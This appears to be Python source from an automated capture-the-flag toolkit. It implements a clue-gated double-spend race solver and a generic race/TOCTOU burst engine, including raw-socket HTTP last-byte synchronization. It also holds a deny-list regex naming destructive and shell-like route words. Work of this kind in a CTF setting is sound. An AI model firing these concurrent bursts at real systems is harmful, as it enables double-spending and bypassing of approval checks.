#!/usr/bin/env python3
"""Bounded, clue-gated double-spend race for web Layer 1.

This is the narrow Day-21 ``Double Spent`` shape observed on Day 27, not a
generic race fuzzer.  A target must disclose an exact ``feature_route`` and
``secondary_route`` in its successful ``/api/clues`` document.  Before any
mutation, fresh or caller-cached controls must establish both sides of the
contract exactly::

    GET <feature_route>   -> 405 {"error":"post_required"}
    GET <secondary_route> -> 403 {"error":"credit_not_overspent","credits":1}

Only then does the solver reserve one complete bounded burst, construct a
separately scope-locked :class:`web.WebClient` for every request, and release
concurrent ``POST {}`` requests together.  The mutation boundary is one-shot:
there is no retry, alternate body, route, or follow-up mutation.  One fresh GET
of the advertised secondary route is the sole readback.  A proof is returned
only when at least two POST responses independently confirm
``credit_redeemed`` and that readback is the exact
``single_credit_spent_twice`` payoff.

``solve(target, ctx)`` mirrors the other proof-hunt peer modules.  ``ctx`` may
contain ``deadline``, ``max_requests``, ``client``, ``client_factory``,
``preloaded``, ``baseline_texts``, ``stop``, ``evidence``, ``result_sink``,
``log_dir`` and ``challenge``.  The module never submits to the Game Master.
"""

from __future__ import annotations

import copy
import datetime as _dt
import json
import os
import re
import sys
import threading
import time
import urllib.parse
from pathlib import Path

# ctf package import (script runs need the checkout root on sys.path)
try:
    from ctf import env as ctf_env, paths as ctf_paths, flagfmt
except ModuleNotFoundError:
    import sys as _sys
    from pathlib import Path as _Path
    _sys.path.append(str(_Path(__file__).resolve().parents[2]))
    from ctf import env as ctf_env, paths as ctf_paths, flagfmt

HERE = Path(__file__).resolve().parent
_TK = HERE.parent / "toolkits"
if str(_TK) not in sys.path:
    sys.path.insert(0, str(_TK))
if str(HERE) not in sys.path:
    sys.path.insert(0, str(HERE))

import web as _web  # noqa: E402
import security_json as _security_json  # noqa: E402 -- fail-closed policy JSON

try:
    import forge_event as _proof_policy  # noqa: E402 -- shared bounded response decoding
except Exception:  # pragma: no cover - partial exports retain the historical raw path
    _proof_policy = None

BASELINE_INCOMPLETE = getattr(
    _proof_policy, "BASELINE_STRICT_INCOMPLETE",
    "<!-- huntress-baseline-strict-set:incomplete -->",
)


REQUEST_TIMEOUT = 8.0
DEFAULT_SECONDS = 30.0
BURST_REQUESTS = 20
DEFAULT_MAX_REQUESTS = BURST_REQUESTS + 4  # clues + two controls + burst + readback
DEADLINE_PAD = 0.3
AUDIT_TIME_RESERVE = 0.5
MAX_TEXT = 400_000
MAX_ROUTE_BYTES = 1024
MAX_CANDIDATE = 256
PROOF_SEEN = flagfmt.PROOF_ANYCASE
PROOF_WIRE = flagfmt.PROOF_TEXT

# A clue may use the observed synthetic verb ``execute``.  It never grants a
# POST to a route whose name describes a destructive account/system action.
# ``process`` and ``dispatch`` are not action words here; those were the other
# two judged route rotations.
_FATAL_PATH = re.compile(
    r"(?i)(?:^|[/_.-])(?:delete|del|remove|rm|destroy|reset|logout|log-out|log_out|signout|"
    r"sign-out|sign_out|logoff|drop|wipe|purge|revoke|disable|deactivate|truncate|flush|clear|"
    r"erase|uninstall|kill|shutdown|restart|reboot|ban|suspend|unregister|cancel|rollback|revert|"
    r"restore|update|transfer|pay|approve|reject|edit|create|insert|upload|import|write|save|submit|"
    r"exec|run|cmd|command|shell|eval)(?=$|[/_.-]|\d)"
)


def enabled() -> bool:
    """Default-on with the same environment/file kill-switch shape as peers."""
    raw = ctf_env.get("CTF_WEB_DOUBLE_SPEND")
    if raw is not None:
        return raw.strip().lower() in ("on", "1", "true", "yes")
    try:
        root = ctf_paths.workdir()
        return not (root / "_double_spend.off").exists()
    except Exception:
        return False


def _origin(value):
    try:
        parts = urllib.parse.urlsplit(str(value or ""))
        if (parts.scheme.lower() not in ("http", "https") or not parts.hostname
                or parts.username is not None or parts.password is not None
                or parts.fragment or "@" in parts.netloc):
            return None
        return (parts.scheme.lower(), parts.hostname.rstrip(".").lower(),
                parts.port or (443 if parts.scheme.lower() == "https" else 80))
    except (TypeError, ValueError):
        return None


def _route(value, base_url):
    """One query-free same-origin route, safe at every canonical layer."""
    try:
        route = _web.safe_same_origin_route(
            value, base_url, allow_query=False, guard_query=True,
            max_bytes=MAX_ROUTE_BYTES)
        if route is None:
            return None
        layers = _web.canonical_route_layers(route, max_bytes=MAX_ROUTE_BYTES)
        guarded_layers = []
        for layer in layers or ():
            guarded_layers.append(layer)
            guarded_layers.append(re.sub(r"([a-z0-9])([A-Z])", r"\1/\2", layer))
        if (not layers or any(_FATAL_PATH.search(layer) for layer in guarded_layers)
                or any(_web.route_has_destructive_action(layer) for layer in layers)):
            return None
        return route
    except Exception:
        return None


def _response(raw):
    if not isinstance(raw, dict):
        return None
    if "body" in raw:
        return raw
    if "text" in raw:
        out = dict(raw)
        out["body"] = str(raw.get("text") or "").encode()
        return out
    return None


def _text(response):
    if not isinstance(response, dict):
        return ""
    if _proof_policy is not None and hasattr(_proof_policy, "response_text_views"):
        try:
            views = _proof_policy.response_text_views(response)
            return str(views[0])[:MAX_TEXT] if views else ""
        except Exception:
            return ""
    value = response.get("body", response.get("text", ""))
    if isinstance(value, (bytes, bytearray)):
        return bytes(value[:MAX_TEXT]).decode("utf-8", "replace")
    return str(value or "")[:MAX_TEXT]


def _baseline_text(response):
    if _proof_policy is not None and hasattr(_proof_policy, "response_baseline_text"):
        try:
            return _proof_policy.response_baseline_text(response)
        except Exception:
            return ""
    text = _text(response)
    raw = response.get("response_headers", response.get("headers", {})) if isinstance(response, dict) else {}
    headers = "\n".join(str(v)[:4096] for v in raw.values()) if isinstance(raw, dict) else ""
    return (text + (("\n" + headers) if headers else ""))[:MAX_TEXT]


def _json(response):
    views = None
    if _proof_policy is not None and hasattr(_proof_policy, "response_text_views"):
        try:
            views = _proof_policy.response_text_views(response)
        except Exception:
            return None
    try:
        value = _security_json.loads_unique(
            views if views is not None else [_text(response)], max_chars=MAX_TEXT)
        return value if isinstance(value, dict) else None
    except Exception:
        return None


def _status(response):
    value = response.get("status") if isinstance(response, dict) else None
    return value if isinstance(value, int) and not isinstance(value, bool) else None


def _proofs(text):
    return list(dict.fromkeys(match.group(0) for match in PROOF_SEEN.finditer(str(text or ""))))


class _DoubleSpend:
    def __init__(self, target, ctx):
        self.target = dict(target) if isinstance(target, dict) else {"url": str(target)}
        self.url = str(self.target.get("url") or "")
        self.ctx = dict(ctx or {})
        try:
            self.deadline = float(self.ctx["deadline"]) if self.ctx.get("deadline") is not None \
                else time.time() + DEFAULT_SECONDS
        except (TypeError, ValueError):
            self.deadline = time.time() + DEFAULT_SECONDS
        try:
            self.max_requests = max(0, int(self.ctx.get("max_requests", DEFAULT_MAX_REQUESTS)))
        except (TypeError, ValueError):
            self.max_requests = DEFAULT_MAX_REQUESTS
        self.external_stop = self.ctx.get("stop")
        self.preloaded = dict(self.ctx.get("preloaded") or {})
        self.baselines = []
        supplied_baselines = list(self.ctx.get("baseline_texts") or [])
        for value in supplied_baselines[:80]:
            text = str(value or "")[:MAX_TEXT]
            if text and text not in self.baselines:
                self.baselines.append(text)
        if len(supplied_baselines) > 80 and BASELINE_INCOMPLETE not in self.baselines:
            self.baselines.append(BASELINE_INCOMPLETE)

        self.requests = 0
        self.posts = 0
        self.audit_requests = 0
        self.merged_log_entries = 0
        self.race_completed = 0
        self.redemptions = 0
        self.responses = []
        self.candidates = []
        self.success = False
        self.where = None
        self.stopped = None
        self.terminal = False
        self.t0 = time.time()
        self._gate = threading.Lock()
        # A burst worker reserves its wire send before leaving ``_gate`` so
        # the requests can overlap.  Track those reservations separately:
        # stop_now() must close the gate and drain every worker, including one
        # paused between its accounting check and ``client.request``.
        self._send_condition = threading.Condition(self._gate)
        self._active_sends = 0
        self._state = threading.Lock()
        self._stopped = False
        self._factory = self.ctx.get("client_factory") if callable(self.ctx.get("client_factory")) else None
        self.client = None
        try:
            if self.ctx.get("client") is not None:
                candidate = self.ctx["client"]
            elif self._factory is not None:
                candidate = self._factory(self.url, REQUEST_TIMEOUT)
            else:
                candidate = _web.WebClient(self.url, timeout=REQUEST_TIMEOUT)
            client_origin = _origin(getattr(candidate, "base", None))
            target_origin = _origin(self.url)
            if client_origin is not None and target_origin is not None and client_origin == target_origin:
                self.client = candidate
            else:
                self.stopped = "client scope mismatch"
        except Exception as exc:
            self.stopped = f"no scoped client: {type(exc).__name__}"

    def left(self):
        return None if self.deadline is None else self.deadline - time.time()

    def _externally_stopped(self):
        return hasattr(self.external_stop, "is_set") and self.external_stop.is_set()

    def _may_send_locked(self, *, requests=1):
        if self._stopped or self._externally_stopped():
            self.stopped = self.stopped or "stopped"
            return False
        if self.requests + requests > self.max_requests:
            self.stopped = self.stopped or "max_requests"
            return False
        left = self.left()
        if left is not None and left <= DEADLINE_PAD:
            self.stopped = self.stopped or "deadline"
            return False
        return True

    def stop_now(self):
        """Close the wire gate and wait for every reserved/in-flight send."""
        with self._send_condition:
            self._stopped = True
            while self._active_sends:
                self._send_condition.wait()

    def _reserve_burst_send(self):
        """Atomically account for and reserve one mutation request."""
        with self._send_condition:
            if not self._may_send_locked():
                return False
            self.requests += 1
            self.posts += 1
            self._active_sends += 1
            return True

    def _reserved_send_still_allowed(self):
        """Recheck stop/deadline after reservation, immediately before I/O."""
        with self._send_condition:
            return self._may_send_locked(requests=0)

    def _release_burst_send(self):
        with self._send_condition:
            self._active_sends = max(0, self._active_sends - 1)
            if self._active_sends == 0:
                self._send_condition.notify_all()

    def _record(self, *, role, path, response=None, error=None, cached=False):
        row = {"method": "POST" if role == "race" else "GET",
               "path": path.split("?", 1)[0], "role": role,
               "status": _status(response), "cached": bool(cached)}
        if error:
            row["error"] = str(error)
        with self._state:
            self.responses.append(row)

    def _set_timeout(self, client, *, reserve_after=0.0):
        try:
            left = self.left()
            client.timeout = REQUEST_TIMEOUT if left is None else max(
                0.2, min(REQUEST_TIMEOUT, left - 0.1 - max(0.0, float(reserve_after))))
        except Exception:
            pass

    def _fresh_get(self, path, role):
        with self._gate:
            if self.client is None or not self._may_send_locked():
                return None
            if role == "audit-payoff" and self.audit_requests:
                self.stopped = self.stopped or "audit already read"
                return None
            self._set_timeout(self.client)
            self.requests += 1
            if role == "audit-payoff":
                self.audit_requests += 1
            try:
                response = self.client.request("GET", path, allow_redirects=False)
            except Exception as exc:
                self._record(role=role, path=path, error=type(exc).__name__)
                self.stopped = self.stopped or f"transport: {type(exc).__name__}"
                self._stopped = True
                return None
        self._record(role=role, path=path, response=response)
        return _response(response)

    def _control(self, path, role):
        cached = _response(self.preloaded.get(path)) if path in self.preloaded else None
        response = cached if cached is not None else self._fresh_get(path, role)
        if cached is not None:
            self._record(role=role, path=path, response=cached, cached=True)
        if response is not None:
            text = _baseline_text(response)
            if text and text not in self.baselines:
                self.baselines.append(text)
        return response

    def _new_burst_client(self):
        candidate = (self._factory(self.url, REQUEST_TIMEOUT) if self._factory is not None
                     else _web.WebClient(self.url, timeout=REQUEST_TIMEOUT))
        client_origin = _origin(getattr(candidate, "base", None))
        target_origin = _origin(self.url)
        if client_origin is None or target_origin is None or client_origin != target_origin:
            raise ValueError("client scope mismatch")
        # Controls use the shared client first.  If that exact-origin client
        # has already completed WebClient's private-target reachability check,
        # carry only the established boolean into each exact-origin clone.
        # Otherwise every concurrent worker opens an extra uncounted TCP probe
        # before its actual POST.  A false/unset state is never promoted.
        if getattr(self.client, "_reached", False) is True and hasattr(candidate, "_reached"):
            candidate._reached = True
        # Separate openers are required for real overlap, but they must still represent the same attempt
        # session. Controls may have established a credit-scoping cookie on the shared client.
        source = getattr(self.client, "_jar", None)
        cookies = list(source) if source is not None else []
        if cookies:
            destination = getattr(candidate, "_jar", None)
            setter = getattr(destination, "set_cookie", None)
            if not callable(setter):
                raise ValueError("burst client cannot inherit the established cookie jar")
            for cookie in cookies:
                setter(copy.copy(cookie))
        self._set_timeout(candidate, reserve_after=AUDIT_TIME_RESERVE)
        return candidate

    def _merge_burst_logs(self, clients, route):
        """Fold one bounded POST record per clone into the shared client log.

        proof_hunt persists only its original WebClient.  The race deliberately
        cannot share that client's cookie jar/opener, so without this fold the
        on-disk request evidence would omit every mutation.  Workers are fully
        joined before this method runs; sorting by wire start then burst index
        gives deterministic-enough evidence without sharing a list while the
        requests are in flight.
        """
        shared = getattr(self.client, "log", None)
        if not isinstance(shared, list):
            return
        folded = []
        for index, client in enumerate(clients, 1):
            rows = getattr(client, "log", None)
            if not isinstance(rows, list):
                continue
            for raw in list(rows)[:4]:
                if not isinstance(raw, dict) or str(raw.get("method") or "").upper() != "POST":
                    continue
                try:
                    path = urllib.parse.urlsplit(str(raw.get("url") or raw.get("path") or "")).path
                except ValueError:
                    path = ""
                if path != route:
                    continue
                row = dict(raw)
                row["peer"] = "double-spend"
                row["race_index"] = index
                started = row.get("started")
                folded.append((started if isinstance(started, (int, float)) else float("inf"), index, row))
                break
        folded.sort(key=lambda item: (item[0], item[1]))
        shared.extend(row for _started, _index, row in folded[:BURST_REQUESTS])
        self.merged_log_entries = min(BURST_REQUESTS, len(folded))

    def _burst(self, route):
        # Fail before the mutation boundary unless the whole burst and the one
        # required audit read fit.  A short budget must never spend one credit.
        with self._gate:
            if not self._may_send_locked(requests=BURST_REQUESTS + 1):
                return []
            left = self.left()
            if left is not None and left <= DEADLINE_PAD + AUDIT_TIME_RESERVE:
                self.stopped = self.stopped or "insufficient time for race and required audit"
                return []
            try:
                clients = [self._new_burst_client() for _ in range(BURST_REQUESTS)]
            except Exception as exc:
                self.stopped = self.stopped or f"burst clients unavailable: {type(exc).__name__}"
                return []
            if (len({id(client) for client in clients}) != BURST_REQUESTS
                    or any(client is self.client for client in clients)):
                self.stopped = self.stopped or "burst clients were not separate"
                return []
            self.terminal = True

        release = threading.Barrier(BURST_REQUESTS + 1)
        results = [None] * BURST_REQUESTS

        def worker(index, client):
            try:
                release.wait(timeout=max(0.2, min(REQUEST_TIMEOUT, self.left() or REQUEST_TIMEOUT)))
            except threading.BrokenBarrierError:
                return
            if not self._reserve_burst_send():
                return
            try:
                if not self._reserved_send_still_allowed():
                    return
                response = client.request("POST", route, data="{}",
                                          headers={"Content-Type": "application/json"},
                                          allow_redirects=False)
                results[index] = _response(response)
                self._record(role="race", path=route, response=response)
            except Exception as exc:
                self._record(role="race", path=route, error=type(exc).__name__)
            finally:
                self._release_burst_send()

        threads = [threading.Thread(target=worker, args=(i, client),
                                    name=f"double-spend-{i + 1}", daemon=True)
                   for i, client in enumerate(clients)]
        for thread in threads:
            thread.start()
        try:
            release.wait(timeout=max(0.2, min(REQUEST_TIMEOUT, self.left() or REQUEST_TIMEOUT)))
        except threading.BrokenBarrierError:
            self.stopped = self.stopped or "burst synchronization failed"
        for thread in threads:
            thread.join()

        self._merge_burst_logs(clients, route)

        self.race_completed = sum(response is not None for response in results)
        self.redemptions = sum(
            1 for response in results
            if _status(response) == 200 and isinstance(_json(response), dict)
            and _json(response).get("ok") is True
            and _json(response).get("effect") == "credit_redeemed")
        return results

    def _audit_proof(self, response):
        body = _json(response)
        if (_status(response) != 200 or not isinstance(body, dict) or body.get("ok") is not True
                or body.get("effect") != "single_credit_spent_twice"):
            return None
        evidence = body.get("evidence")
        if isinstance(evidence, str) and evidence:
            self.candidates.append(evidence[:MAX_CANDIDATE])
        if not isinstance(evidence, str) or not PROOF_WIRE.fullmatch(evidence):
            return None
        # Delegate ambiguity and novelty to the shared complete carrier policy.
        # Exact proof_ tokens are not the only competing representation: a
        # future labelled value, CourseStack-style flag, MIME sibling or header
        # must also prevent automatic selection.  If this optional policy is
        # absent or fails, losing the auto-answer is safer than reverting to a
        # narrower regex over a concatenated prefix.
        if (_proof_policy is None or not hasattr(_proof_policy, "extract_success")):
            return None
        try:
            host = urllib.parse.urlsplit(self.url).hostname
            info = _proof_policy.extract_success(
                response, self.baselines, host=host)
        except Exception:
            return None
        for value in list(info.get("candidates") or []) + list(info.get("wire") or []):
            value = str(value)[:MAX_CANDIDATE]
            if value and value not in self.candidates:
                self.candidates.append(value)
        return evidence if info.get("success") is True and info.get("auto") == evidence else None

    def run(self):
        if not enabled():
            self.stopped = "off"
            return None
        if self.client is None or self.max_requests <= 0:
            self.stopped = self.stopped or "unavailable"
            return None
        if self._externally_stopped():
            self.stopped = "stopped"
            return None
        if self.left() is not None and self.left() <= DEADLINE_PAD:
            self.stopped = "deadline"
            return None

        clues_r = self._control("/api/clues", "clues")
        clues = _json(clues_r)
        if _status(clues_r) != 200 or not isinstance(clues, dict):
            self.stopped = self.stopped or "no clue document"
            return None
        feature = _route(clues.get("feature_route"), self.url)
        secondary = _route(clues.get("secondary_route"), self.url)
        if not feature or not secondary or feature == secondary:
            self.stopped = "incomplete or unsafe double-spend routes"
            return None
        route_allowed = self.ctx.get("route_allowed")
        if callable(route_allowed):
            try:
                if not route_allowed(feature) or not route_allowed(secondary):
                    self.stopped = "caller refused double-spend routes"
                    return None
            except Exception:
                self.stopped = "caller route guard failed"
                return None

        feature_r = self._control(feature, "feature-control")
        feature_j = _json(feature_r)
        if _status(feature_r) != 405 or not isinstance(feature_j, dict) \
                or feature_j.get("error") != "post_required":
            self.stopped = "feature control did not require POST"
            return None
        audit_control = self._control(secondary, "audit-control")
        audit_j = _json(audit_control)
        credits = audit_j.get("credits") if isinstance(audit_j, dict) else None
        if (_status(audit_control) != 403 or not isinstance(audit_j, dict)
                or audit_j.get("error") != "credit_not_overspent"
                or isinstance(credits, bool) or not isinstance(credits, int) or credits != 1):
            self.stopped = "audit control was not one unspent credit"
            return None

        self._burst(feature)
        # The mutation is terminal even if transport/deadline prevented a clean
        # result.  There is no second burst.  One fresh audit GET is permitted.
        if not self.terminal:
            return None
        audit = self._fresh_get(secondary, "audit-payoff")
        if audit is None:
            self.stopped = self.stopped or "race spent; no audit payoff"
            return None
        self.where = "double-spend-race"
        proof = self._audit_proof(audit)
        self.success = self.redemptions >= 2 and proof is not None
        if not self.success:
            self.stopped = self.stopped or (
                "audit payoff lacked two confirmed redemptions" if self.redemptions < 2
                else "audit payoff was not uniquely provable")
            return None
        return proof

    def summary(self, proof):
        candidates = [value for value in dict.fromkeys(self.candidates) if value != proof]
        baseline_incomplete = False
        if _proof_policy is not None and hasattr(_proof_policy, "baseline_set_incomplete"):
            try:
                baseline_incomplete = bool(
                    _proof_policy.baseline_set_incomplete(self.baselines))
            except Exception:
                baseline_incomplete = True
        return {
            "proof": proof,
            "success": self.success,
            "candidates": candidates[:12],
            "baseline_proofs": list(dict.fromkeys(
                value for text in self.baselines for value in _proofs(text)
            ))[:24],
            "baseline_incomplete": baseline_incomplete,
            "requests": self.requests,
            "posts": self.posts,
            "race_width": BURST_REQUESTS,
            "race_completed": self.race_completed,
            "redemptions": self.redemptions,
            "audit_requests": self.audit_requests,
            "merged_log_entries": self.merged_log_entries,
            "race_started": self.terminal,
            "terminal": self.terminal,
            "seconds": round(time.time() - self.t0, 3),
            "where": self.where,
            "stopped": self.stopped,
            "responses": self.responses[:BURST_REQUESTS + 4],
        }


# =====================================================================================
# B-048: generic race / TOCTOU burst engine
#
# The clue-gated ``_DoubleSpend`` flow above is deliberately narrow: it only ever fires at
# a target that advertises an exact 405/403 credit contract and refuses any
# destructive-sounding *advertised* route (the route text is untrusted target input there).
#
# B-048 is the other shape (csctf "Two-Key Turn", 9108): an operator who has already read a
# live ``GET /schema`` and therefore *knows* the approve/confirm route and the bearer
# credential wants to race a two-person-rule / TOCTOU distinctness check by firing a tunable
# burst of simultaneous requests so two land inside the pending window.  That route is
# operator-supplied and trusted, so this engine does NOT apply the clue-route
# destructive-action filter; it only pins every request to the scope-locked client's own
# origin (``safe_same_origin_route``) and never leaves it.
#
# Two transports are offered, both reporting the observed state transitions:
#   * ``"separate"``      -- ``width`` independent connections released together by a barrier
#                            (works over http and https; uses the scope-locked WebClient).
#   * ``"single-packet"`` -- last-byte synchronization: every connection sends all but the
#                            final byte of its request, then, once all are primed, the final
#                            bytes are flushed together so the server receives the completed
#                            requests as close to simultaneously as the host allows.  HTTP/1.1
#                            over cleartext only; TLS raises ``RaceUnsupported`` rather than
#                            silently downgrading (no silent fallback).
# When a burst loses with ``409 {"retry_after_ms": ...}`` (the server's next-window hint),
# ``race()`` waits that delay (via an injected ``sleep``) and re-bursts, up to ``retries``.
# The engine never submits to the Game Master and never guesses.
# =====================================================================================

RACE_DEFAULT_WIDTH = 8
RACE_MAX_WIDTH = 64
RACE_MAX_RETRIES = 5
RACE_RETRY_CAP_MS = 60_000.0
RACE_READ_CAP = 256 * 1024
RACE_CONNECT_TIMEOUT = 8.0
RACE_READ_TIMEOUT = 8.0
RACE_BARRIER_TIMEOUT = 10.0
_RACE_STATE_KEYS = ("state", "status", "effect", "order_status", "phase", "result")
_RACE_RETRY_MS_KEYS = ("retry_after_ms", "retryAfterMs", "retry_after_millis")
_RACE_RETRY_S_KEYS = ("retry_after", "retryAfter", "retry_after_s", "retry_after_seconds")
_RACE_BODY_METHODS = frozenset({"POST", "PUT", "PATCH", "DELETE"})


class RaceUnsupported(Exception):
    """A requested burst mode cannot run on this target -- named loudly, never silent."""


def race_width(value, default=RACE_DEFAULT_WIDTH):
    """Clamp a caller-supplied burst width to ``1..RACE_MAX_WIDTH`` or raise ``ValueError``."""
    if value is None:
        value = default
    try:
        width = int(value)
    except (TypeError, ValueError):
        raise ValueError(f"race width must be an integer, got {value!r}")
    if width < 1 or width > RACE_MAX_WIDTH:
        raise ValueError(f"race width must be between 1 and {RACE_MAX_WIDTH}, got {width}")
    return width


def _normalize_response(resp):
    """Fold a WebClient/fake-client response dict into ``{status, body, headers}``."""
    if not isinstance(resp, dict):
        return {"status": None, "body": b"", "headers": {}}
    status = _status(resp)
    body = resp.get("body")
    if body is None and "text" in resp:
        body = resp.get("text")
    if isinstance(body, str):
        body = body.encode("utf-8", "replace")
    if not isinstance(body, (bytes, bytearray)):
        body = b""
    raw_headers = resp.get("response_headers")
    if not isinstance(raw_headers, dict):
        raw_headers = resp.get("headers") if isinstance(resp.get("headers"), dict) else {}
    headers = {str(k).lower(): v for k, v in raw_headers.items()}
    out = {"status": status, "body": bytes(body[:RACE_READ_CAP]), "headers": headers}
    if resp.get("error"):
        out["error"] = str(resp.get("error"))
    return out


def _race_text(response):
    body = response.get("body") if isinstance(response, dict) else None
    if isinstance(body, (bytes, bytearray)):
        return bytes(body[:RACE_READ_CAP]).decode("utf-8", "replace")
    return str(body or "")[:RACE_READ_CAP]


def _race_json(response):
    try:
        value = _security_json.loads_unique([_race_text(response)], max_chars=RACE_READ_CAP)
        return value if isinstance(value, dict) else None
    except Exception:
        return None


def race_state(response):
    """A short, comparable state label for one response (status + any state field)."""
    if not isinstance(response, dict):
        return "no-response"
    status = _status(response)
    if response.get("error"):
        return f"error:{response['error']}"
    body = _race_json(response)
    label = None
    if isinstance(body, dict):
        for key in _RACE_STATE_KEYS:
            value = body.get(key)
            if isinstance(value, str) and value.strip():
                label = value.strip()[:64]
                break
            if isinstance(value, bool):
                label = f"{key}={str(value).lower()}"
                break
    if label is None:
        return f"HTTP {status}" if status is not None else "no-response"
    return f"{label} (HTTP {status})" if status is not None else label


def race_retry_after_ms(response):
    """Parse a 409 next-window hint: body ``retry_after_ms``/``retry_after`` or a Retry-After header."""
    if not isinstance(response, dict):
        return None
    body = _race_json(response)
    if isinstance(body, dict):
        for key in _RACE_RETRY_MS_KEYS:
            value = body.get(key)
            if isinstance(value, (int, float)) and not isinstance(value, bool) and value >= 0:
                return min(float(value), RACE_RETRY_CAP_MS)
        for key in _RACE_RETRY_S_KEYS:
            value = body.get(key)
            if isinstance(value, (int, float)) and not isinstance(value, bool) and value >= 0:
                return min(float(value) * 1000.0, RACE_RETRY_CAP_MS)
    headers = response.get("headers") if isinstance(response, dict) else None
    if isinstance(headers, dict):
        raw = headers.get("retry-after")
        if raw is not None:
            try:
                return min(max(0.0, float(str(raw).strip())) * 1000.0, RACE_RETRY_CAP_MS)
            except (TypeError, ValueError):
                return None
    return None


def _client_scope(client):
    scope = getattr(client, "_scope", None)
    if isinstance(scope, tuple) and len(scope) == 3:
        scheme, host, port = scope
        return str(scheme).lower(), str(host), int(port)
    origin = _origin(getattr(client, "base", None))
    if origin is None:
        raise RaceUnsupported("client exposes no usable scope for the race transport")
    return origin


def _same_origin_path(route, client):
    base = getattr(client, "base", None) or getattr(client, "origin", None)
    safe = _web.safe_same_origin_route(route, base, allow_query=False,
                                       max_bytes=MAX_ROUTE_BYTES)
    if safe is None:
        raise RaceUnsupported(f"route {route!r} is not on the scope-locked target origin")
    return safe


def _raw_request_bytes(method, path, host, port, body, headers):
    method = str(method).upper()
    if isinstance(body, str):
        body_bytes = body.encode("utf-8")
    elif isinstance(body, (bytes, bytearray)):
        body_bytes = bytes(body)
    else:
        body_bytes = b""
    host_header = host if port in (80, 443) else f"{host}:{port}"
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host_header}"]
    seen = set()
    for key, value in (headers or {}).items():
        name = str(key)
        low = name.lower()
        if low in ("host", "content-length", "connection"):
            continue
        seen.add(low)
        lines.append(f"{name}: {value}")
    if "content-type" not in seen and method in _RACE_BODY_METHODS:
        lines.append("Content-Type: application/json")
    if method in _RACE_BODY_METHODS or body_bytes:
        lines.append(f"Content-Length: {len(body_bytes)}")
    lines.append("Connection: close")
    head = ("\r\n".join(lines) + "\r\n\r\n").encode("latin-1")
    return head + body_bytes


def _read_raw_response(sock, read_timeout):
    import socket as _socket
    chunks = []
    total = 0
    sock.settimeout(read_timeout)
    while total < RACE_READ_CAP:
        try:
            chunk = sock.recv(65536)
        except (_socket.timeout, OSError):
            break
        if not chunk:
            break
        chunks.append(chunk)
        total += len(chunk)
    raw = b"".join(chunks)
    status = None
    headers = {}
    body = b""
    sep = raw.find(b"\r\n\r\n")
    if sep != -1:
        head = raw[:sep]
        body = raw[sep + 4:]
        head_lines = head.split(b"\r\n")
        if head_lines:
            parts = head_lines[0].split(b" ")
            if len(parts) >= 2 and parts[1].isdigit():
                status = int(parts[1])
        for line in head_lines[1:]:
            if b":" in line:
                name, _, value = line.partition(b":")
                headers[name.strip().decode("latin-1").lower()] = value.strip().decode("latin-1")
    else:
        body = raw
    return {"status": status, "body": body[:RACE_READ_CAP], "headers": headers}


def _release_barrier(width, barrier_timeout):
    return threading.Barrier(width + 1), barrier_timeout


def burst_separate(clients, method, route, *, body=None, headers=None,
                   barrier_timeout=RACE_BARRIER_TIMEOUT, on_event=None,
                   release_factory=threading.Barrier):
    """Fire one synchronized burst over ``len(clients)`` independent connections.

    Every worker blocks on a shared barrier and is released together, so the requests overlap
    on the wire.  Returns one normalized response per client (``None`` slots never happen; a
    failed worker yields a response carrying ``error``).

    The release gate is built by ``release_factory(parties)`` and defaults to
    :class:`threading.Barrier`.  It must take ``width`` worker parties plus the one coordinating
    party (``width + 1``) so no worker proceeds until every worker *and* the coordinator have
    arrived -- that ``width + 1`` is what makes the burst overlap rather than trickle.  The
    parameter exists so a test can inject an instrumented gate and assert the engine's own
    all-together release (not merely the fakes' internal synchronization) is what fires.
    """
    width = len(clients)
    if width < 1:
        return []
    results = [None] * width
    release = release_factory(width + 1)

    def worker(index, client):
        try:
            release.wait(timeout=barrier_timeout)
        except threading.BrokenBarrierError:
            results[index] = {"status": None, "body": b"", "headers": {}, "error": "barrier"}
            return
        try:
            resp = client.request(method, route, data=body, headers=headers,
                                  allow_redirects=False)
            results[index] = _normalize_response(resp)
            if on_event:
                on_event(index, "sent")
        except Exception as exc:  # pragma: no cover - exercised via fault-injecting fakes
            results[index] = {"status": None, "body": b"", "headers": {},
                              "error": type(exc).__name__}

    threads = [threading.Thread(target=worker, args=(i, c), daemon=True,
                                name=f"race-sep-{i + 1}") for i, c in enumerate(clients)]
    for thread in threads:
        thread.start()
    try:
        release.wait(timeout=barrier_timeout)
    except threading.BrokenBarrierError:
        pass
    for thread in threads:
        thread.join()
    return [r if r is not None else {"status": None, "body": b"", "headers": {}, "error": "no-result"}
            for r in results]


def burst_single_packet(client, method, route, *, width, body=None, headers=None,
                        withhold=1, connect_timeout=RACE_CONNECT_TIMEOUT,
                        read_timeout=RACE_READ_TIMEOUT,
                        barrier_timeout=RACE_BARRIER_TIMEOUT, on_event=None):
    """Fire one burst with HTTP/1.1 last-byte synchronization over raw sockets.

    Each connection sends all but the final ``withhold`` bytes of its (identical) request and
    parks on a barrier; once every connection is primed the final bytes are flushed together.
    Cleartext HTTP only -- a TLS target raises :class:`RaceUnsupported` (no silent downgrade).
    Only the scope-locked client's own host/port are ever contacted.  ``on_event(index, name)``
    observes ``"primed"`` and ``"final"`` per connection, which lets a caller verify the
    discipline (every connection primed before any final byte leaves).
    """
    scheme, host, port = _client_scope(client)
    if scheme == "https":
        raise RaceUnsupported(
            "single-packet last-byte sync does not support TLS; re-run with mode='separate'")
    path = _same_origin_path(route, client)
    raw = _raw_request_bytes(method, path, host, port, body, headers)
    hold = max(1, min(int(withhold), len(raw) - 1))
    head, tail = raw[:-hold], raw[-hold:]
    results = [None] * width
    release = threading.Barrier(width + 1)
    import socket

    def worker(index):
        sock = None
        try:
            sock = socket.create_connection((host, port), timeout=connect_timeout)
            sock.settimeout(read_timeout)
            sock.sendall(head)
            if on_event:
                on_event(index, "primed")
            try:
                release.wait(timeout=barrier_timeout)
            except threading.BrokenBarrierError:
                results[index] = {"status": None, "body": b"", "headers": {}, "error": "barrier"}
                return
            sock.sendall(tail)
            if on_event:
                on_event(index, "final")
            results[index] = _read_raw_response(sock, read_timeout)
        except Exception as exc:
            results[index] = {"status": None, "body": b"", "headers": {},
                              "error": type(exc).__name__}
        finally:
            if sock is not None:
                try:
                    sock.close()
                except Exception:
                    pass

    threads = [threading.Thread(target=worker, args=(i,), daemon=True,
                                name=f"race-sp-{i + 1}") for i in range(width)]
    for thread in threads:
        thread.start()
    try:
        release.wait(timeout=barrier_timeout)
